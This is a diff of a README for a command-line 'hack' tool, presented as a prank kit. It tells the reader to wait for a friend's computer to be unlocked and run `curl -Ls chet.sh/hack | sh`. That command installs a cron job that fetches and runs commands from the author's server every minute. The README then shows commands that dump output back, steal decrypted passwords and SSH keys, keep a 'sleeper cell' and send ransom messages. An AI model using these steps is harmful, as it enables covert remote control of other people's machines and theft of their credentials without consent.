@@ -1,5 +1,7 @@
 # Hack
 
+This project helps your hack your friends. All you need to do is wait for them to leave their computer unlocked, open up Terminal, and run a single curl command. I'll walk you through how to set it up for yourself.
+
 ## Getting Started
 
 Clone, install, and link so you can use the `hack` cli tool.
@@ -58,94 +60,63 @@ What this does is sets up a cron job to ping the /env/live endpoint every minute
 
 So once you've hacked your friend, you can do everything else with the commandline tool from your computer.
 
+We have a concept of different hacked environments. When you hack someone using the `/hack` endpoint, that person starts off in the live environment, and there are a variety of commands you can run on each environment.
 
+The following will rewrite the live environment shell script to execute the following command which will say aloud "I'm watching you". Classic prank, right?!
 
-
-
-
-
-
-
-
-- dump endpoint
-- 420 command
-- register with noip and add ssh accepted hosts
-- ls ~/.ssh/* | xargs cat
-
-
-
-- git push heroku master
-
-
-- heroku ps:scale web=1
-- heroku open
-
-
-- heroku logs --tail
-
-
-- heroku local web
-
-
-
-- xo?
-
-
-# To Do
-
-- CLI should generate shell scripts with "HACK_URL" which will get injected by express based on the heroku config
-
--
-
-xo and test
-
-
-update without pushing / redeploying?
-
-heroku config:set HEROKU_URL=$(heroku info -s | grep web-url | cut -d= -f2)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-git
-Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.
-
-Now go to your commandline and we can start having some fun.
-
+```sh
+hack live exec "say 'I\'m watching you'"
 ```
-hack live exec "say hello world"
-hack live interval 1y # sleeper cell
-hack live cron "20 16 * * * * say 'its foe 20, ye better be toke-in'"
-hack live reset
-hack live forget
+
+Well its not going to work yet, you still have to redeploy to your heroku instance.
+
+```sh
+hack deploy
+```
+
+And then you can wait for the next minute and watch your buddy's computer ping your server.
+
+```sh
+hack logs
+```
+
+The whole point of environments is so you can hack multiple people at the same time. That's why you can rename the environment.
+
+```sh
 hack live rename jon
-hack jon ...
 ```
 
-# FYI
+Next time the live env is pinged, it will rewrite the cron job to start pinging the jon environment instead. You can do everything the same just by changing the environment argument.
 
-http://www.nncron.ru/help/EN/working/cron-format.htm
+```sh
+hack jon exec "say 'fuck you jon'"
+```
+
+Now if you've had enough fun for the day and the party's over, you can forget jon and assure him that you've "unhacked" him.
+
+```sh
+hack jon forget
+```
+
+That will erase the cron job from his computer. But if you know Jon is going to ice you again and you really hate being iced, you might just want to just put this environment in sleeper-cell mode so you can recover it later.
+
+```sh
+hack jon interval 1d
+```
+
+Now, rather than pinging your server every minute (the default), it will ping every day at midnight. And when you find that Natty Ice in your sock drawer before class, you can change the interval back to every minute and the next day, you're good for revenge!
+
+```sh
+hack jon interval 1m
+```
+
+Some other fun things to do are setting up additional cron jobs. One of the classics is the "fuck you" every hour.
+
+```sh
+hack jon cron "0 * * * * say 'fuck you jon'"
+```
+
+If you don't remember how cron jobs work, [this is a great resource](http://www.nncron.ru/help/EN/working/cron-format.htm). Its pretty much all comes down to this little diagram.
 
 ```
 * * * * *
@@ -158,33 +129,43 @@ http://www.nncron.ru/help/EN/working/cron-format.htm
 +------------ Minute            (range: 0-59)
 ```
 
+Another good one is the 4/20 reminder.
+
+```sh
+hack jon cron "20 16 * * * * say 'its foe 20, ye better be toke-in'"
+```
+
+The computer-guy's voice is a little weird so it can help to type out some more phoenetic sounds. This one is such a classic, that I've actually made it a preset.
+
+```sh
+hack jon preset 420
+```
+
+And if you've written a ton of cronjobs and you don't know whats on there anymore, you can use the dump command.
+
+```sh
+hack jon dump "crontab -l"
+```
+
+Now whip open your logs (`hack logs`) and you'll see the stdout on the next ping. This is actually much more sinister now that you can get information back. If you really want to fuck with them, you can search for decrpyted passwords or steal their ssh keys.
+
+```sh
+hack jon preset passwords
+hack jon preset ssh
+```
+
+But if you just want to give him a good old-fashioned scare, send him a ransom message!
+
+```sh
+hack jon preset ransom "Hello Jon, next time you ice me, I'll be deleting all the porn off your computer."
+```
+
+Lastly, if you find yourself adding a bunch of cronjobs and just want to start over, just give it a nice reset.
+
+```sh
+hack jon reset
+```
+
 # PS
 
-How to make a Node.js CLI app: http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm
-
-# PPS
-
-Bought the domain name `chet.sh` here: https://www.nic.sh/
-
-# To Do
-
-- demo
-- better readme
-- better help
-- better command validation
-- configure with custom domain name
-
-# Getting Started
-
-```sh
-git clone ...
-cd hack
-npm install
-npm link
-```
-
-On your buddy's computer, just need to run this:
-
-```sh
-curl -sL chet.sh/hack | sh
-```
+[A nice resource on how to make a Node.js CLI app.](http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm)
